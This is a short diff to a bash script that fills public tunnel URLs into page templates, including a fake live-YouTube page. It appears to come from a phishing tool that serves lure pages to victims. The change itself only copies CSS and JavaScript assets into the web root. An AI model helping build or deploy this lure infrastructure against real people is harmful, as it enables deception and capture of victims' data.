@@ -294,6 +294,9 @@ link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
 sed 's+forwarding_link+'$link'+g' frontent/index.html > index2.html
+# Copy frontent assets to root so PHP can serve them
+cp -f frontent/style.css style.css 2>/dev/null
+cp -f frontent/main.js main.js 2>/dev/null
 elif [[ $option_tem -eq 2 ]]; then
 sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
@@ -449,6 +452,9 @@ link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.n
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
 sed 's+forwarding_link+'$link'+g' frontent/index.html > index2.html
+# Copy frontent assets to root so PHP can serve them
+cp -f frontent/style.css style.css 2>/dev/null
+cp -f frontent/main.js main.js 2>/dev/null
 elif [[ $option_tem -eq 2 ]]; then
 sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
